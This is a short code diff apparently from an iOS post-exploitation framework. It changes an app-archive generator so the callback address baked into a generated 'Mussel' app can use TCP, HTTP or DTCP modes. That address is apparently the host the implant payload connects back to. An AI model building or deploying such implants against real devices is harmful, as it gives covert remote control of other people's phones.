@@ -31,6 +31,11 @@ from alive_progress import alive_bar
 from pex.string import String
 
 from seashell.lib.config import Config
+from seashell.core.device import (
+    MODE_TCP,
+    MODE_HTTP,
+    MODE_DTCP
+)
 
 
 class IPA(Config):
@@ -40,16 +45,17 @@ class IPA(Config):
     an implementation of iOS Application Archive generator.
     """
 
-    def __init__(self, host: str, port: int) -> None:
+    def __init__(self, host: str, port: int, mode: str = MODE_TCP) -> None:
         """ Initialize device generator.
 
         :param str host: host to connect to
         :param int port: port to connect to
+        :param str mode: mode to use for payload
         :return None: None
         """
 
         self.hash = String().base64_string(
-            f'tcp://{str(host)}:{str(port)}', decode=True)
+            f'{mode}://{str(host)}:{str(port)}', decode=True)
 
         self.app_name = 'Mussel'
         self.bundle_id = 'com.entysec.mussel'
